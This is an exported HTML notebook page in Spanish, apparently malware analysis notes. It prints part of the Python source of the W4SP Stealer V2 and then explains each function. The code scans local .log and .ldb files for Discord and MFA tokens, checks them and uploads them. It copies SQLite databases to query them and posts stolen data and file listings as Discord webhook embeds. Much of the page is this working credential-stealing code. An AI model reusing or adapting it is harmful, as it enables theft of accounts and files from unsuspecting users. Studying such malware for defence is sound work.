<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>parte 6</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>parte 6</h1><br/><p><div class="codebox"><pre><br /><span style="color:#000000;font-weight:700">def</span> <span style="color:#729fcf;font-weight:400">Reformat</span>(listt):<br />    e = re.findall(<span style="color:#edd400;font-weight:400">&quot;(\w+[a-z])&quot;</span>,listt)<br />    <span style="color:#000000;font-weight:700">while</span> <span style="color:#edd400;font-weight:400">&quot;https&quot;</span> <span style="color:#000000;font-weight:700">in</span> e: e.remove(<span style="color:#edd400;font-weight:400">&quot;https&quot;</span>)<br />    <span style="color:#000000;font-weight:700">while</span> <span style="color:#edd400;font-weight:400">&quot;com&quot;</span> <span style="color:#000000;font-weight:700">in</span> e: e.remove(<span style="color:#edd400;font-weight:400">&quot;com&quot;</span>)<br />    <span style="color:#000000;font-weight:700">while</span> <span style="color:#edd400;font-weight:400">&quot;net&quot;</span> <span style="color:#000000;font-weight:700">in</span> e: e.remove(<span style="color:#edd400;font-weight:400">&quot;net&quot;</span>)<br />    <span style="color:#000000;font-weight:700">return</span> <span style="color:#729fcf;font-weight:400">list</span>(<span style="color:#729fcf;font-weight:400">set</span>(e))<br /><br /><span style="color:#000000;font-weight:700">def</span> <span style="color:#729fcf;font-weight:400">upload</span>(name, link):<br /><br />    <span style="color:#888a85;font-weight:400"># return</span><br /><br />    headers = {<br />        <span style="color:#edd400;font-weight:400">&quot;Content-Type&quot;</span>: <span style="color:#edd400;font-weight:400">&quot;application/json&quot;</span>,<br />        <span style="color:#edd400;font-weight:400">&quot;User-Agent&quot;</span>: <span style="color:#edd400;font-weight:400">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0&quot;</span><br />    }<br /><br />    <span style="color:#000000;font-weight:700">if</span> <span style="color:#edd400;font-weight:400">&quot;Data Searcher&quot;</span> <span style="color:#000000;font-weight:700">in</span> name:<br />        data = {<br />            <span style="color:#edd400;font-weight:400">&quot;content&quot;</span>: GLINFO,<br />            <span style="color:#edd400;font-weight:400">&quot;embeds&quot;</span>: [<br />                {<br />                <span style="color:#edd400;font-weight:400">&quot;title&quot;</span>: f<span style="color:#edd400;font-weight:400">&quot;W4SP | Data Extractor&quot;</span>,<br />                <span style="color:#edd400;font-weight:400">&quot;color&quot;</span>: <span style="color:#edd400;font-weight:400">15781403</span>,<br />                <span style="color:#edd400;font-weight:400">&quot;fields&quot;</span>: link,<br />                <span style="color:#edd400;font-weight:400">&quot;footer&quot;</span>: {<br />                    <span style="color:#edd400;font-weight:400">&quot;text&quot;</span>: <span style="color:#edd400;font-weight:400">&quot;@W4SP STEALER V2&quot;</span>,<br />                    <span style="color:#edd400;font-weight:400">&quot;icon_url&quot;</span>: <span style="color:#edd400;font-weight:400">&quot;https://cdn.discordapp.com/attachments/1066129000952512552/1069061940363657246/waspv2logo.png&quot;</span><br />                },<br />                }<br />            ],<br />            <span style="color:#edd400;font-weight:400">&quot;avatar_url&quot;</span>: <span style="color:#edd400;font-weight:400">&quot;https://cdn.discordapp.com/attachments/1066129000952512552/1069061940363657246/waspv2logo.png&quot;</span>,<br />            <span style="color:#edd400;font-weight:400">&quot;attachments&quot;</span>: []<br />            }<br />        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)<br />        <span style="color:#000000;font-weight:700">return</span><br /><br /><br /><br />    <span style="color:#000000;font-weight:700">if</span> <span style="color:#edd400;font-weight:400">&quot;NationsGlory&quot;</span> <span style="color:#000000;font-weight:700">in</span> name:<br />        data = {<br />            <span style="color:#edd400;font-weight:400">&quot;content&quot;</span>: GLINFO,<br />            <span style="color:#edd400;font-weight:400">&quot;embeds&quot;</span>: [<br />                {<br />                <span style="color:#edd400;font-weight:400">&quot;title&quot;</span>: f<span style="color:#edd400;font-weight:400">&quot;W4SP | {name.split(&#39;;&#39;)[0]}&quot;</span>,<br />                <span style="color:#edd400;font-weight:400">&quot;color&quot;</span>: <span style="color:#edd400;font-weight:400">15781403</span>,<br />                <span style="color:#edd400;font-weight:400">&quot;fields&quot;</span>: link,<br />                <span style="color:#edd400;font-weight:400">&quot;footer&quot;</span>: {<br />                    <span style="color:#edd400;font-weight:400">&quot;text&quot;</span>: <span style="color:#edd400;font-weight:400">&quot;@W4SP STEALER V2&quot;</span>,<br />                    <span style="color:#edd400;font-weight:400">&quot;icon_url&quot;</span>: <span style="color:#edd400;font-weight:400">&quot;https://cdn.discordapp.com/attachments/1066129000952512552/1069061940363657246/waspv2logo.png&quot;</span><br />                },<br />                <span style="color:#edd400;font-weight:400">&quot;thumbnail&quot;</span>: {<br />                    <span style="color:#edd400;font-weight:400">&quot;url&quot;</span>: name.split(<span style="color:#edd400;font-weight:400">&#39;;&#39;</span>)[<span style="color:#edd400;font-weight:400">1</span>]<br />                }<br />                }<br />            ],<br />            <span style="color:#edd400;font-weight:400">&quot;avatar_url&quot;</span>: <span style="color:#edd400;font-weight:400">&quot;https://cdn.discordapp.com/attachments/1066129000952512552/1069061940363657246/waspv2logo.png&quot;</span>,<br />            <span style="color:#edd400;font-weight:400">&quot;attachments&quot;</span>: []<br />            }<br />        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)<br />        <span style="color:#000000;font-weight:700">return</span><br />    <br />    <span style="color:#000000;font-weight:700">if</span> name == <span style="color:#edd400;font-weight:400">&quot;kiwi&quot;</span>:<br />        string = link.split(<span style="color:#edd400;font-weight:400">&quot;\n\n&quot;</span>)<br />        endlist = []<br />        <span style="color:#000000;font-weight:700">for</span> i <span style="color:#000000;font-weight:700">in</span> string:<br />            i = i.split(<span style="color:#edd400;font-weight:400">&quot;\n&quot;</span>)<br />            i = <span style="color:#729fcf;font-weight:400">list</span>(<span style="color:#729fcf;font-weight:400">filter</span>(<span style="color:#ce5c00;font-weight:400">None</span>, i))<br />            val = <span style="color:#edd400;font-weight:400">&quot;&quot;</span><br />            <span style="color:#000000;font-weight:700">for</span> x <span style="color:#000000;font-weight:700">in</span> i:<br />                <span style="color:#000000;font-weight:700">if</span> x.startswith(<span style="color:#edd400;font-weight:400">&quot;└─&quot;</span>):<br />                    val += x + <span style="color:#edd400;font-weight:400">&quot;\n&quot;</span><br />            <span style="color:#000000;font-weight:700">if</span> <span style="color:#729fcf;font-weight:400">len</span>(i) &gt; <span style="color:#edd400;font-weight:400">1</span>:<br />                endlist.append({<span style="color:#edd400;font-weight:400">&quot;name&quot;</span>: i[<span style="color:#edd400;font-weight:400">0</span>], <span style="color:#edd400;font-weight:400">&quot;value&quot;</span>: val, <span style="color:#edd400;font-weight:400">&quot;inline&quot;</span>: <span style="color:#ce5c00;font-weight:400">False</span>})<br />        data = {<br />            <span style="color:#edd400;font-weight:400">&quot;content&quot;</span>: GLINFO,<br />            <span style="color:#edd400;font-weight:400">&quot;embeds&quot;</span>: [<br />                {<br />                <span style="color:#edd400;font-weight:400">&quot;color&quot;</span>: <span style="color:#edd400;font-weight:400">14406413</span>,<br />                <span style="color:#edd400;font-weight:400">&quot;fields&quot;</span>: endlist,<br />                <span style="color:#edd400;font-weight:400">&quot;title&quot;</span>: f<span style="color:#edd400;font-weight:400">&quot;W4SP | File Stealer&quot;</span>,<br />                <span style="color:#edd400;font-weight:400">&quot;footer&quot;</span>: {<br />                    <span style="color:#edd400;font-weight:400">&quot;text&quot;</span>: <span style="color:#edd400;font-weight:400">&quot;@W4SP STEALER V2&quot;</span>,<br />                    <span style="color:#edd400;font-weight:400">&quot;icon_url&quot;</span>: <span style="color:#edd400;font-weight:400">&quot;https://cdn.discordapp.com/attachments/1066129000952512552/1069061940363657246/waspv2logo.png&quot;</span><br />                }<br />                }<br />            ],<br />            <span style="color:#edd400;font-weight:400">&quot;attachments&quot;</span>: []<br />            }<br />        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)<br />        <span style="color:#000000;font-weight:700">return</span><br /><br /><span style="color:#000000;font-weight:700">def</span> <span style="color:#729fcf;font-weight:400">writeforfile</span>(data, name):<br />    path = os.getenv(<span style="color:#edd400;font-weight:400">&quot;TEMP&quot;</span>) + f<span style="color:#edd400;font-weight:400">&quot;\wp{name}.txt&quot;</span><br />    <span style="color:#000000;font-weight:700">with</span> <span style="color:#729fcf;font-weight:400">open</span>(path, mode=<span style="color:#edd400;font-weight:400">&#39;w&#39;</span>, encoding=<span style="color:#edd400;font-weight:400">&#39;utf-8&#39;</span>) <span style="color:#ad7fa8;font-weight:400">as</span> f:<br />        <span style="color:#000000;font-weight:700">for</span> line <span style="color:#000000;font-weight:700">in</span> data:<br />            <span style="color:#000000;font-weight:700">if</span> line[<span style="color:#edd400;font-weight:400">0</span>] != <span style="color:#edd400;font-weight:400">&#39;&#39;</span>:<br />                f.write(f<span style="color:#edd400;font-weight:400">&quot;{line}\n&quot;</span>)<br /><br /><span style="color:#000000;font-weight:700">def</span> <span style="color:#729fcf;font-weight:400">getToken</span>(path, arg):<br />    <span style="color:#000000;font-weight:700">if</span> <span style="color:#000000;font-weight:700">not</span> os.path.exists(path): <span style="color:#000000;font-weight:700">return</span><br /><br />    path += arg<br />    <span style="color:#000000;font-weight:700">for</span> file <span style="color:#000000;font-weight:700">in</span> os.listdir(path):<br />        <span style="color:#000000;font-weight:700">if</span> file.endswith(<span style="color:#edd400;font-weight:400">&quot;.log&quot;</span>) <span style="color:#000000;font-weight:700">or</span> file.endswith(<span style="color:#edd400;font-weight:400">&quot;.ldb&quot;</span>)   :<br />            <span style="color:#000000;font-weight:700">for</span> line <span style="color:#000000;font-weight:700">in</span> [x.strip() <span style="color:#000000;font-weight:700">for</span> x <span style="color:#000000;font-weight:700">in</span> <span style="color:#729fcf;font-weight:400">open</span>(f<span style="color:#edd400;font-weight:400">&quot;{path}\\{file}&quot;</span>, errors=<span style="color:#edd400;font-weight:400">&quot;ignore&quot;</span>).readlines() <span style="color:#000000;font-weight:700">if</span> x.strip()]:<br />                <span style="color:#000000;font-weight:700">for</span> regex <span style="color:#000000;font-weight:700">in</span> (<span style="color:#edd400;font-weight:400">r&quot;[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}&quot;</span>, <span style="color:#edd400;font-weight:400">r&quot;mfa\.[\w-]{80,95}&quot;</span>):<br />                    <span style="color:#000000;font-weight:700">for</span> token <span style="color:#000000;font-weight:700">in</span> re.findall(regex, line):<br />                        <span style="color:#000000;font-weight:700">global</span> Tokens<br />                        <span style="color:#000000;font-weight:700">if</span> checkToken(token):<br />                            <span style="color:#000000;font-weight:700">if</span> <span style="color:#000000;font-weight:700">not</span> token <span style="color:#000000;font-weight:700">in</span> Tokens:<br />                                Tokens += token<br />                                uploadToken(token, path)<br /><br /><br /><span style="color:#000000;font-weight:700">def</span> <span style="color:#729fcf;font-weight:400">SqlThing</span>(pathC, tempfold, cmd):<br />    shutil.copy2(pathC, tempfold)<br />    conn = sql_connect(tempfold)<br />    cursor = conn.cursor()<br />    cursor.execute(cmd)<br />    data = cursor.fetchall()<br />    cursor.close()<br />    conn.close()<br />    os.remove(tempfold)<br />    <span style="color:#000000;font-weight:700">return</span> data<br />    </pre></div></p><p><ol><li>1. <strong><h1>1. Reformat(listt):</h1></strong></li></ol></p><p></p><p><h3>Esta función toma una cadena de texto y usa una expresión regular para extraer palabras que consisten en caracteres alfabéticos en minúsculas. Luego filtra y elimina términos como &quot;https&quot;, &quot;com&quot;, y &quot;net&quot;. Finalmente, devuelve un conjunto único de los elementos extraídos.</h3><h3></h3></p><p><h3></h3><ul><li><strong><h3>Expresión Regular</h3></strong><h3>: </h3><code><h3>(\w+[a-z])</h3></code><h3> busca palabras que contienen letras alfabéticas en minúsculas.</h3></li><li><strong><h3>Eliminación de palabras clave</h3></strong><h3>: Remueve específicamente &quot;https&quot;, &quot;com&quot;, y &quot;net&quot;, que usualmente están presentes en URLs.</h3></li></ul><h3></h3></p><p><h3></h3><ol><li>2. <strong><h1>2. upload(name, link):</h1></strong></li></ol></p><p></p><p><h3>Esta función maneja la carga de datos a través del hook en formato JSON. Dependiendo del valor de </h3><code><h3>name</h3></code><h3>, el formato del mensaje varía.</h3><h3></h3></p><p><h3></h3><ul><li><strong><h3>Encabezados (</h3></strong><strong><code><h3>headers</h3></code></strong><strong><h3>)</h3></strong><h3>: Se definen encabezados estándar para la solicitud HTTP, incluyendo el tipo de contenido y el user-agent.</h3></li></ul><h3></h3></p><p><h3></h3><ul><li><strong><h3>Carga de Datos de &quot;Data Searcher&quot;</h3></strong><h3>: Si el nombre contiene &quot;Data Searcher&quot;, se estructura un mensaje con un título fijo y se agregan los datos en un formato de </h3><code><h3>embed</h3></code><h3>. Este se envía con una imagen de un logo (probablemente W4SP Stealer V2) y un avatar.</h3></li></ul><h3></h3></p><p><h3></h3><ul><li><strong><h3>Carga para &quot;NationsGlory&quot;</h3></strong><h3>: Similar al caso anterior, pero también incluye una miniatura que se especifica en </h3><code><h3>name</h3></code><h3>.</h3></li></ul><h3></h3></p><p><h3></h3><ul><li><strong><h3>Carga para &quot;kiwi&quot;</h3></strong><h3>: Este caso parece estar relacionado con la extracción y carga de archivos, ya que la información está organizada en una lista con detalles de archivos y carpetas.</h3></li></ul><h3></h3></p><p><h3></h3><ol><li><h3>3. </h3><strong><h1>3. writeforfile(data, name):</h1></strong></li></ol></p><p></p><p><h3>Escribe los datos proporcionados en un archivo de texto en el directorio temporal del sistema.</h3><h3></h3></p><p><h3></h3><ul><li><strong><h3>Ruta de archivo</h3></strong><h3>: El archivo se guarda en la carpeta temporal del sistema (</h3><code><h3>os.getenv(&quot;TEMP&quot;)</h3></code><h3>) con el nombre proporcionado.</h3></li><li><strong><h3>Escritura</h3></strong><h3>: Los datos se escriben línea por línea, siempre que la primera línea no esté vacía.</h3></li></ul></p><p><ol><li>4. <strong><h1>4. getToken(path, arg):</h1></strong></li></ol><strong></strong></p><p><strong></strong></p><p><h3>Esta función busca y extrae tokens de un directorio dado, posiblemente en busca de credenciales o tokens de acceso.</h3><ul><li><strong><h3>Exploración de Archivos</h3></strong><h3>: Explora archivos </h3><code><h3>.log</h3></code><h3> o </h3><code><h3>.ldb</h3></code><h3> en la ruta especificada y lee línea por línea en busca de coincidencias con expresiones regulares predefinidas para detectar tokens.</h3></li></ul><h3></h3></p><p><h3></h3><ul><li><strong><h3>Expresiones Regulares</h3></strong><h3>:</h3></li><li><code><h3>[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}</h3></code><h3>: Esta expresión coincide con tokens de 3 partes separados por puntos.</h3></li><li><code><h3>mfa\.[\w-]{80,95}</h3></code><h3>: Coincide con tokens de autenticación multifactor (</h3><code><h3>mfa</h3></code><h3>).</h3></li></ul><h3></h3></p><p><h3></h3><h3></h3></p><p><h3></h3><ul><li><strong><h3>Subida de Tokens</h3></strong><h3>: Si encuentra un token válido (después de verificarlo con la función </h3><code><h3>checkToken</h3></code><h3>), lo sube utilizando la función </h3><code><h3>uploadToken</h3></code><h3>.</h3></li></ul></p><p><ol><li>5. <strong><h1>5. SqlThing(pathC, tempfold, cmd):</h1></strong></li></ol></p><p></p><p><h3>Esta función ejecuta una consulta SQL en una base de datos SQLite copiada temporalmente.</h3><h3></h3></p><p><h3></h3><ul><li><strong><h3>Copia del Archivo</h3></strong><h3>: Usa </h3><code><h3>shutil.copy2</h3></code><h3> para copiar el archivo de base de datos original a una carpeta temporal.</h3></li><li><strong><h3>Ejecución del Comando SQL</h3></strong><h3>:◇ Establece una conexión con la copia de la base de datos.</h3></li><li><h3>Ejecuta el comando SQL proporcionado (</h3><code><h3>cmd</h3></code><h3>).</h3></li><li><h3>Recupera los resultados y cierra la conexión.</h3></li></ul><h3></h3></p><p><h3></h3><h3></h3></p><p><h3></h3><ul><li><strong><h3>Eliminación</h3></strong><h3>: Una vez ejecutado el comando, elimina la copia temporal de la base de datos.</h3></li></ul><h3></h3></p><p><h3></h3></p><p></p><p></p><p></p><p></p></div>
</body>
</html>
